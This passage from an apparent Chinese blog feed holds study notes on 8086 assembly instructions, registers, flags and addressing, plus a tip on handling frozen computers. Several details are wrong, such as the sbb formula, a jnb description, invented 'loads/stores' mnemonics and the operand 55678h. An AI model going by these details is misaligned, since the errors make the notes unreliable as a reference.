id="算数运算指令"><a href="#算数运算指令" class="headerlink" title="算数运算指令"></a>算数运算指令</h1><p>包括：加法指令、减法指令、乘法指令、除法指令</p><ol><li>加法指令<br>8086CPU有5条加法指令</li></ol><ul><li>add（addition），加法指令</li><li>adc（add with carry），带位加法</li><li>inc（increment），自增</li><li>aaa（ASCII adjust for addition）</li><li>daa（decimal adjust for addition）</li></ul><p>（1）add ast, src<br>(dst) <- (dst) + (src)<br>add指令的源操作数和目的操作数不能同时为存储器，也不能为段寄存器。<br>add指令影响标志位：</p><ul><li>8位有符号数相加，和超出范围（-128~127），或16位有符号数相加，和超出范围（-32786~32767），则O=1</li><li>8位无符号数相加，和超过255，或16位有符号数相加，和超过65535，则C=1</li><li>其它标志（S、A、P、Z）由运算结果按照定义确定</li></ul><blockquote><p>有符号数在计算机中以补码形式存储，当运算结果超过-128时向下溢出为127，反之向上溢出为-127。至于无符号数，没有所谓的溢出问题，只存在逻辑上的进位和借位。</p></blockquote><p>（2）adc dst, src<br>(dst) <- (dst) + (src) + C</p><p>C就是标志寄存器进位位的当前值。</p><p>adc指令主要用于多字节运算，如 <code>adc cx, 300</code>，<code>adc al, bl</code>，<code>adc dx, [si]</code></p><p>求和：两个32位数<br>12345678h + 0abcdefabh = ?</p><p>mov ax, 1234h<br>mov bx, 55678h<br>add bx, 0efabh<br>adc ax, 0abcdh</p><p>（3）inc dst<br>(dst) <- (dst) + 1</p><p>inc指令用于在循环程序中修改地址指针和循环次数<br>影响S、Z、A、P、O标志位，不影响C。</p><ol start="2"><li>减法指令</li></ol><p>（1）sub dst, src<br>(dst) <- (dst) - (src)</p><p>（2）sbb dst, src<br>(dst) < (dst) - (src) -1</p><p>（3）dec dst<br>(dst) <- (dst) - 1</p><p>减法指令类比加法指令即可。</p><p>（4）neg dst（求补指令）<br>(dst) <- 0 - (dst)<br>neg指令把操作数按位求反后末位加1。<br>影响标志位：A、C、O、P、S、Z。</p><p>（5）比较指令<br>比较指令用来比较两个数之间的关系</p><ul><li>根据Z，判断两个数是否相等</li><li>根据C，判断两个无符号数的大小关系</li><li>根据S、O，判断两个有符号数的大小关系</li></ul><ol start="3"><li>乘法指令</li></ol><p>（1）mul src（无符号乘法）<br>字节操作：ax <- (al) x (src)<br>字操作    ：dx:ax <- (ax) x (src)</p><p>（2）imul src（带符号乘法）<br>同mul，但操作数均带符号。按有符号数的规则相乘。</p><ol start="4"><li>除法指令</li></ol><p>（1）div src（无符号除法）<br>字节操作：al <- (ax) / (src)<br>      ah <- (ax) / (src)<br>字操作    ：ax <- (dx:ax) / (src)之商<br>      dx <- (dx:ax) / (src)之余数</p><p>（2）idiv（带符号除法）<br>同div，但操作数均带符号。按有符号数的规则相除。</p><p>（3）字节扩展指令（cwb）<br>格式：cbw  ;convert byte to word<br>功能：将al字节扩展成字，符号位及高字节在ah中。</p><p>（4）字扩展指令（cwd）<br>格式：cwd  ;convert word to double word<br>功能：将ax扩展成双字，符号位及高位字在dx中。</p><p>这两条指令是对被除数al或ax进行扩展。</p><h1 id="位操作类指令"><a href="#位操作类指令" class="headerlink" title="位操作类指令"></a>位操作类指令</h1><p>一、逻辑运算指令</p><ol><li><p>AND<br>按位“与”<br>格式：and dst, src<br>功能：按位与，当且仅当两操作数对应位都是1时，对应位置1，否则置0。</p></li><li><p>TEST（测试指令）<br>同AND，但是结果不保存。仅用来改变标志位。</p></li><li><p>OR<br>按位“或”<br>格式：or dst, src<br>功能：按位或，当且仅当两操作数对应位都是0时，对应位置0，否则置1。</p></li><li><p>XOR<br>“异或”指令<br>格式：xor dst, src<br>功能：对应位，不同置1，相同置0。</p></li><li><p>NOT<br>按位取反<br>格式：not dst<br>操作：按位取反<br>not指令的dst不能是立即数，可以是寄存器或存储器。</p></li></ol><p>二、移位指令</p><ul><li>SAL（Shift Arithmetic Left），算数左移</li><li>SAR（Shift Arithmetic Right），算数右移</li><li>SHL（Shift Logical Left），逻辑左移</li><li>SHR（Shift Logocal Right），逻辑右移</li><li>ROL（Rotate Left），循环左移</li><li>ROR（Rotate Right），循环右移</li><li>RCL（Rotate Left），带进位循环左移</li><li>RCR（Roate Right），带进位循环右移</li></ul><p>移位指令的格式<br></p><figure class="highlight hsp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">操作码 reg/mem, <span class="keyword">cnt</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>cnt可以是立即数，也可以是寄存器（保存cnt的值）<br></p><figure class="highlight x86asm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">shl</span> <span class="number">ah</span>, <span class="number">1</span></span><br><span class="line"><span class="keyword">sal</span>, sl, <span class="built_in">cl</span></span><br><span class="line"><span class="keyword">sal</span> <span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">bx</span>+<span class="number">5</span>]</span><br><span class="line"><span class="keyword">rol</span> <span class="number">bh</span>, <span class="number">1</span></span><br><span class="line"><span class="keyword">rol</span> <span class="built_in">dx</span>, <span class="built_in">cl</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>算数移位需要考虑符号位，右移一位若符号位为1则左边补1，否则补零（SAL、SAR）<br></p><figure class="highlight x86asm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="number">ah</span>, <span class="number">3fh</span><span class="comment">;(ah)= 0011 1111b</span></span><br><span class="line"><span class="keyword">sal</span> <span class="number">ah</span>, <span class="number">1</span><span class="comment">;(ah)=0011 11110b</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cl</span>, <span class="number">2</span></span><br><span class="line"><span class="keyword">mov</span> <span class="keyword">sal</span> <span class="number">ah</span>, <span class="built_in">cl</span><span class="comment">;(ah)=f8h</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>逻辑移位不需要考虑符号位，右移一位左边补零，左移一位右边补零（SHL、SHR）<br>SHR右移的时候，它的最高位用0填补，最低位移入CF<br></p><figure class="highlight x86asm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">shr</span> <span class="built_in">bl</span>, <span class="number">1</span></span><br><span class="line"><span class="keyword">shr</span> <span class="built_in">ax</span>, <span class="built_in">cl</span></span><br><span class="line"><span class="keyword">shr</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">di</span>+<span class="built_in">bp</span>], <span class="number">1</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>循环移位，左边移出到右边，右边移出到左边<br></p><figure class="highlight x86asm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">11110000b</span></span><br><span class="line"><span class="keyword">rol</span> <span class="built_in">al</span>, <span class="number">1</span><span class="comment">;循环左移，执行后结果为11100001b，CF=1</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>带进位的循环移位<br>循环左移，进位值（原CF）到低位，高位进CF<br>循环右移，进位制（原CF）到高位，低位进CF<br></p><figure class="highlight x86asm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">11110000b</span></span><br><span class="line"><span class="keyword">rcl</span> <span class="built_in">al</span>, <span class="number">1</span><span class="comment">;带进位的循环左移，执行后结果为11100000,CF=1</span></span><br></pre></td></tr></tbody></table></figure><p></p><h1 id="串操作类指令"><a href="#串操作类指令" class="headerlink" title="串操作类指令"></a>串操作类指令</h1><p>“串”就是内存中一段地址和相连的字节或字,“串”操作也称“数据块”操作。<br>可实现存储器数据间的直接传送。8086CPU有5种基本的串操作：</p><ul><li>movs（move string），串传送指令</li><li>cmps（compare string），串比较指令</li><li>scas（scan string），串扫描指令</li><li>lods（load from string），取串指令</li><li>stos（stroe from string），存串指令</li></ul><ol><li>串传送指令</li></ol><p>（1）movs指令<br>传送指令实际上完成了复制操作，将ds:si传送到es:di（将数据段传送到附加段）。<br></p><figure class="highlight x86asm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">1000h</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span><span class="comment">;数据段地址赋值</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">1000h</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span><span class="comment">;附加段地址赋值</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, <span class="number">0013h</span><span class="comment">;源数据块首地址</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">di</span>, <span class="number">1003h</span><span class="comment">;目的数据块首地址</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">4</span><span class="comment">;数据块长度赋值计数器</span></span><br><span class="line"><span class="keyword">std</span><span class="comment">;将方向位DF置1，由高地址和向地地址传送</span></span><br><span class="line"><span class="symbol">lp:</span><span class="keyword">movsb</span><span class="comment">;完成一个字节数据传送</span></span><br><span class="line">  <span class="keyword">dec</span> <span class="built_in">cx</span><span class="comment">;计数器减一</span></span><br><span class="line">  <span class="keyword">jnz</span> lp<span class="comment">;cx不为0，继续传送（ZF位仅受CX寄存器影响）</span></span><br><span class="line"><span class="keyword">hlt</span><span class="comment">;中断</span></span><br></pre></td></tr></tbody></table></figure><p></p><blockquote><p>上面循环部分可用rep指令进行简化。当(cx)≠0时，(cx)<-(cx)-1，并执行rep指令后的串指令；当(cx)=0时，结束rep，执行下一条指令。</p></blockquote><p>（2）loads指令<br>将si指定的数据段中某单元内容赋给al或ax</p><ul><li>loadsb（字节）：(al) <- (ds:si), (si) <- (si) + 1</li><li>loadsw（字）：(ax) <- (ds:si), (si) <- (si) + 2</li></ul><p>（3）stores指令<br>与rep重复指令连用时，可以用来建立一串相同的值，串长度由cx内容决定</p><ul><li>storesb（字节）：(es:di) <- (al), (di) <- (di) + 1</li><li>storesw（字）：(es:di) <- (ax), (di) <- (di) + 2</li></ul><p>（4）cmps指令<br>比较(es:di)-(ds:si)。结果不存，置标志。<br>cmpsb（字节）：(si) <- (si) ± 1, (di) <- (di) + 1<br>cmpsw（字）：(si) <- (si) ± 2, (di) <- (di) ± 2</p><p>（5）scas指令<br>将di执行数据段中某单元内容赋给al或ax</p><ul><li>scasb（字节）：(al) <- (es:di), (di) <- (di) ± 1</li><li>scasw（字）：(ax) <- (es:di), (di) <- (di) ± 2</li></ul><h1 id="程序控制类指令"><a href="#程序控制类指令" class="headerlink" title="程序控制类指令"></a>程序控制类指令</h1><p>一、转移指令<br>转移指令控制程序从一处转换到另一处执行。在CPU内部，转移是通过将目标地址传送给IP来实现的</p><p>转移指令包括：</p><ul><li>无条件转移指令（jmp，谐音jump）</li><li>条件转移指令（5类）</li></ul><p>（1）无条件转移指令jmp<br></p><figure class="highlight avrasm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">jmp</span> 语句标号</span><br></pre></td></tr></tbody></table></figure><p></p><p>（2）条件转移指令</p><p>根据flag的值，判断是否跳转</p><p>① Z标志<br></p><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jz;jump <span class="keyword">if</span> <span class="literal">zero</span></span><br><span class="line">jnz;jump <span class="keyword">if</span> <span class="keyword">not</span> <span class="literal">zero</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>② C标志<br></p><figure class="highlight mipsasm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">jc</span><span class="comment">;jump if carry</span></span><br><span class="line"><span class="keyword">jnc</span><span class="comment">;jump if not carry</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>③ P标志<br></p><figure class="highlight fortran"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jp;jump <span class="keyword">if</span> <span class="built_in">parity</span></span><br><span class="line">jnp;jump <span class="keyword">if</span> not <span class="built_in">parity</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>④ S标志<br></p><figure class="highlight gams"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">js;jump <span class="keyword">if</span> <span class="keyword">negative</span></span><br><span class="line">jns;jump <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">negative</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>⑤ O标志<br></p><figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jo;jump <span class="built_in">if</span> <span class="built_in">overflow</span></span><br><span class="line">jno;jump <span class="built_in">if</span> <span class="keyword">not</span> <span class="built_in">overflow</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>根据两个无符号数大小关系转移</p><blockquote><p>判断两个数的大小，这需要同时考虑多个标志位，如jle跳转条件为 “ZF=1 OR SF≠OF”，你可以先用cmp指令判断两个数的大小，这会影响标志位的值，接着下一行条件跳转利用这个结果。</p></blockquote><figure class="highlight applescript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">jb;jump <span class="keyword">if</span> <span class="keyword">below</span></span><br><span class="line">jnae;jump <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">above</span> <span class="keyword">or</span> <span class="keyword">equal</span></span><br><span class="line">jnb;jump <span class="keyword">if</span> <span class="keyword">below</span></span><br><span class="line">jae;jump <span class="keyword">if</span> <span class="keyword">above</span> <span class="keyword">or</span> <span class="keyword">equal</span></span><br><span class="line">jbe;jump <span class="keyword">if</span> <span class="keyword">below</span> <span class="keyword">or</span> <span class="keyword">equal</span></span><br><span class="line">jna;jump <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">above</span></span><br><span class="line">jnbe;jump <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">below</span> <span class="keyword">or</span> <span class="keyword">equal</span></span><br><span class="line">ja;jump <span class="keyword">if</span> <span class="keyword">above</span></span><br></pre></td></tr></tbody></table></figure><p>根据两个有符号数大小关系转移</p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">jl;jump <span class="keyword">if</span> <span class="keyword">less</span></span><br><span class="line">jnge;jump <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">greater</span> <span class="keyword">or</span> <span class="keyword">equal</span></span><br><span class="line">jnl;jump <span class="keyword">if</span> <span class="keyword">less</span></span><br><span class="line">jge;jump <span class="keyword">if</span> <span class="keyword">greater</span> <span class="keyword">or</span> <span class="keyword">equal</span></span><br><span class="line">jle;jump <span class="keyword">if</span> <span class="keyword">less</span> <span class="keyword">or</span> <span class="keyword">equal</span></span><br><span class="line">jng;jump <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">greater</span></span><br><span class="line">jnle;jump <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">less</span> <span class="keyword">or</span> <span class="keyword">equal</span></span><br><span class="line">jg;jump <span class="keyword">if</span> <span class="keyword">greater</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p><strong>注意：所有的条件转移指令都是段内（-128~+127）转移</strong></p></blockquote><p>二、过程调用指令</p><ul><li>call</li><li>ret、retn、retf</li></ul><p>三、循环控制指令</p><p>（1）loop（无条件循环）<br>首先(cx) <- (cx) - 1，若 cx ≠ 0，转向目标地址继续执行，否则执行loop后的指令。</p><p>（2）条件循环指令</p><ul><li>looppz、looppe</li><li>loopnz、loopne<br>第一行两条指令的效果一样，都是先cx自减1，判断cx是否为0，还要判断ZF位是否为1，若cx≠0且z=1，则跳转，当cx或zf=0时，循环结束。<br>第二行和第一行相比，cx效果不变，ZF为0时才跳转。</li></ul><p>四、中断指令（interrupt）</p><p>（1）中断调用：int n  ;n是中断号，0~255<br>（2）中断返回：iret</p><p>五、处理器控制类指令</p><p>（1）标志处理指令<br></p><figure class="highlight sqf"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">clc;clear carry <span class="built_in">flag</span></span><br><span class="line">stc;<span class="built_in">set</span> carry <span class="built_in">flag</span></span><br><span class="line">cmc;complement carry <span class="built_in">flag</span></span><br><span class="line">cld;clear <span class="built_in">direction</span> <span class="built_in">flag</span></span><br><span class="line">std;<span class="built_in">set</span> <span class="built_in">direction</span> <span class="built_in">flag</span></span><br><span class="line">cli;clear interrupt <span class="built_in">flag</span></span><br><span class="line">sti;<span class="built_in">set</span> interrupt enable <span class="built_in">flag</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>（2）其它处理机控制指令<br></p><figure class="highlight mipsasm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">nop</span><span class="comment">;no operation</span></span><br><span class="line">hlt<span class="comment">;cpu halt</span></span><br><span class="line"><span class="keyword">wait</span><span class="comment">;cpu wait</span></span><br><span class="line">lock<span class="comment">;bus lock</span></span><br></pre></td></tr></tbody></table></figure><p></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/uploads/gaitubao_680x360_WordItOut-word-cloud-3710871.jpg&quot; alt&gt;&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="汇编" scheme="https://celestialcode.xyz/categories/%E6%B1%87%E7%BC%96/"/>
    
    
      <category term="温故知新" scheme="https://celestialcode.xyz/tags/%E6%B8%A9%E6%95%85%E7%9F%A5%E6%96%B0/"/>
    
  </entry>
  
  <entry>
    <title>汇编复习（一）</title>
    <link href="https://celestialcode.xyz/%E6%B1%87%E7%BC%96%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89.html"/>
    <id>https://celestialcode.xyz/汇编复习（一）.html</id>
    <published>2019-03-26T09:43:41.000Z</published>
    <updated>2019-05-08T18:36:16.173Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/uploads/assembly-languagemasm-x8086.jpg" alt><br><a id="more"></a></p><h1 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h1><p>汇编语言（assembly language）是一种用于电子计算机、微处理器、微控制电路或其它可编程器件的低级语言，亦称为符号语言。在汇编语言中，用助记符（Mnemonics）代替机器指令的操作码，用地址符号（Symbol）或标号（Label）代替指令或操作数的地址。在不同的设备中，汇编语言对应着不同的机器语言指令集，通过汇编过程转换成机器指令。普遍地说，特定的汇编语言和特定的机器语言指令集是一一对应的，不同平台之间不可直接移植。</p><h1 id="进制"><a href="#进制" class="headerlink" title="进制"></a>进制</h1><p>进制即进位计算制，是人为定义的带进位的计数方法。<br>在早期设计的机械计算装置中，使用的还不是二进制，而是十进制或其它进制，利用齿轮的不同位置表示不同的数值，这种计算装置更加接近人类的思维方式。但是随着计算量的增加，随着电子电路的发展，二进制的优越性便逐渐凸显。使用二进制机器码，可以很方便的描述电路的各种状态，以及它们组合产生的不同逻辑门。</p><p>使用二级制的好处：</p><ol><li>技术实现简单</li><li>简化运算规则</li><li>适合逻辑运算</li><li>易于进行转换</li><li>二进制的抗干扰能力强，只有高电位和低电位两个状态。</li></ol><p>二级制的好处大大的有，但是坏处是<strong>书写麻烦，逢二进一的计数方案并不适合人类书写记忆。</strong>为了克服这一障碍，于是我们有了十六进制来表示二进制。十六进制转换有16位，每一个数字位上可以是0、1、2、3、4、5、6、7、8、9、A、B、C、D、E、F，这十五个数字之一。按照进位规则，十六进制逢十六进一。</p><p>十进制转换二进制：除二取余法<br><img src="/uploads/chu_er_qu_yu_fa.jpg" alt="除二取余法"></p><p>二进制和十六进制的相互转换：取四合一法、取一拆四法<br><img src="/uploads/bin2hex.jpg" alt="进制对应关系"></p><h1 id="比特和存储器"><a href="#比特和存储器" class="headerlink" title="比特和存储器"></a>比特和存储器</h1><p>计算机中最小的信息单位是bit（比特，位），也就是一个二进制位。<br>计算机中最小的数据存储单位是Byte（B字节），8 bit = 1 byte。</p><ul><li>1024B    =1KB</li><li>1024KB=1MB</li><li>1024MB=1GB</li><li>1024GB=1TB</li></ul><p>存储器被划分为若干个存储单元，一个存储单元可以存储一个字节，也就是8个二进制位。<br>对于一个有128个存储单元的存储器：</p><ul><li>容量为128字节</li><li>编号就是0-127</li></ul><p>每个存储单元由两部分组成：</p><ul><li>存储单元的地址（十六进制）</li><li>存储单元的内容（十六进制）</li></ul><p>它们在计算机中，看起来是这样的。如下如所示，存储了<br>02h 1Ah ACh 00h BEh<br><img src="/uploads/xiaoduan.jpg" alt="小端存储"><br>这叫<strong>小端存储，即高位字节放在高地址，低位字节放在地地址。与之相对的还有大端，其存储规则相反。</strong></p><h1 id="段（segment）"><a href="#段（segment）" class="headerlink" title="段（segment）"></a>段（segment）</h1><p>最常见的代码段（code segment）和数据段（data segment）。<br>代码段：存储程序的指令。一般可读、不可写、可执行。<br>数据段：存储程序中用到的数据。一般可读、可写、可执行。</p><p>8086CPU有四个段寄存器</p><ul><li>CS：代码段（code segment）</li><li>DS：数据段（data segment）</li><li>SS：栈段（stack segment）</li><li>ES：附加（extra segment）</li></ul><p><strong>8086CPU任意时刻，将CS:IP指向的内容作为即将下一步执行的指令。</strong><br>也就是说，通过改变CS:IP的值，可以改变程序的执行流程。</p><ul><li>只修改IP（段内转移），比如 <code>jmp ax</code></li><li>同时修改CS:IP（段间转移），比如 <code>jmp 3:0B13</code></li></ul><h1 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h1><p>计算机根据<strong>物理地址</strong>对代码进行定位。<br></p><figure class="highlight fix"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">物理地址 </span>=<span class="string"> 基础地址 + 偏移地址</span></span><br><span class="line"><span class="string"> = 基础地址 + 段地址x10H</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>逻辑地址</strong>从应用程序角度看待内存。其形式为<br></p><figure class="highlight makefile"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">段基地址:段内偏移地址</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>将逻辑地址左移4位，加上偏移地址就得到20位物理地址。<br>比如：逻辑地址1234:100 -> 物理地址12400。左移四位就是一个十六进制进位。</p><h1 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h1><p>标志寄存器的命名，总是某F的形式（xx flag）。8086CPU的几个标志位如下。<br>（标志寄存器是一个整体，其中CF、OF等都是它上面的某个bit位）</p><ul><li>CF：进位</li><li>PF：奇偶</li><li>AF：辅助</li><li>ZF：为零</li><li>SF：符号</li><li>TF：单步</li><li>IF：中断</li><li>DF：方向</li><li>OF：溢出</li></ul><p>状态位如CF、PF等，判断为真时等于1，否则为0。<br>TF、IF、DF，这些都是控制位，用于控制程序。</p><p>详解</p><p>CF（carry flag）：进位标志位，一般情况进行无符号运算时，它记录运算结果的最高位向更高位的进位值，或从更高位的借位值，如果运算结果的最高位产生了一个进位或错位，那么其值为1，否则为0。</p><p>ZF（zero flag）：零位标志位，它记录相关指令执行后的结果是否为0，如果是0，那么ZF=1，否则为0。</p><p>SF（sign flag）：符号标志位，它记录相关指令执行后的结果是否为负，如果为负，那么SF=1，否则为0。</p><p>OF（overflow flag）：溢出标志位，在进行有符号数运算的时候，如果结果超出了计算机所能表示的范围称为溢出，此时OF=1，否则为0。</p><p>以及两个用于程序控制的控制位</p><p>TF（trap flag）：追踪标志位，当追踪标志位被置为1时，CPU进入单步执行方式，即每执行一条指令产生一个单步中断请求。</p><p>IF（interrupt-enable FLAG）：中断允许标志位，用于决定CPU是否相应CPU外部的可屏蔽中断发出的中断请求，但不管该标志为何值，CPU都必须相应CPU外部的不可屏蔽中断发出的中断请求，以及CPU内部产生的中断请求。<br>IF=1，CPU可响应CPU外部的可屏蔽中断发出的请求，<br>IF=0，CPU可不响应CPU外部的可屏蔽中断发出的请求。<br>CPU的指令系统中也有专门的指令来改变标志位IF的值。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/uploads/assembly-languagemasm-x8086.jpg&quot; alt&gt;&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="汇编" scheme="https://celestialcode.xyz/categories/%E6%B1%87%E7%BC%96/"/>
    
    
      <category term="温故知新" scheme="https://celestialcode.xyz/tags/%E6%B8%A9%E6%95%85%E7%9F%A5%E6%96%B0/"/>
    
  </entry>
  
  <entry>
    <title>电脑死机，以后别再强制重启了</title>
    <link href="https://celestialcode.xyz/%E7%94%B5%E8%84%91%E6%AD%BB%E6%9C%BA%EF%BC%8C%E4%BB%A5%E5%90%8E%E5%88%AB%E5%86%8D%E5%BC%BA%E5%88%B6%E9%87%8D%E5%90%AF%E4%BA%86.html"/>
    <id>https://celestialcode.xyz/电脑死机，以后别再强制重启了.html</id>
    <published>2019-03-24T05:26:19.000Z</published>
    <updated>2019-05-08T18:36:16.173Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/uploads/zuo_si.jpg" alt="作死行为"><br><a id="more"></a><br>对于那些习惯于Windows的人，crash似乎已经成了家常便饭。<br>别急着强制重启，ctrl+shift+esc/delete调出任务管理器，然后重新建立一个新的explorer.exe，如果是Windwos8以上用户，可直接在打开的界面选择重新载入Windows资源管理器。</p><p>如果你是Linux用户，请使用下面的方法。<br>同时按住alt+ctrl+SysReq/PtrScr一到两秒钟，保持alt和ctrl，松开SysReq/PrtScr，依次按下r、e、i、s、u、b这六个键，当你按下最后的一个b时，不出意外地话Linux就重启了。<br>（在这之前，如果尝试alt+ctrl+f[1-7]登录可行，就在终端下搞定，不过一般死机终端是打不开的）</p><p>至于Mac系列，按opt+cmd+esc，选择需要关闭的程序即可，如果仍无响应再考虑强制重启。</p><p>别再傻傻的强制重启了，对电脑不好，这样做不但对磁盘硬件造成一定损害，而且会使内存中的数据丢失。数据是无价的，而且这样做真的对电脑伤害很大。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/uploads/zuo_si.jpg&quot; alt=&quot;作死行为&quot;&gt;&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="电脑技巧" scheme="https://celestialcode.xyz/categories/%E7%94%B5%E8%84%91%E6%8A%80%E5%B7%A7/"/>
    
    
      <category term="别作死" scheme="https://celestialcode.xyz/tags/%E5%88%AB%E4%BD%9C%E6%AD%BB/"/>
    
  </entry>
  
  <entry>
    <title>我为什么写独立博客</title>
    <link href="https://celestialcode.xyz/%E6%88%91%E4%B8%BA%E4%BB%80%E4%B9%88%E5%86%99%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2.html"/>
    <id>https://celestialcode.xyz/我为什么写独立博客.html</id>
    <published>2019-03-19T07:43:37.000Z</published>
    <updated>2019-05-08T18:36:16.173Z</updated>
    
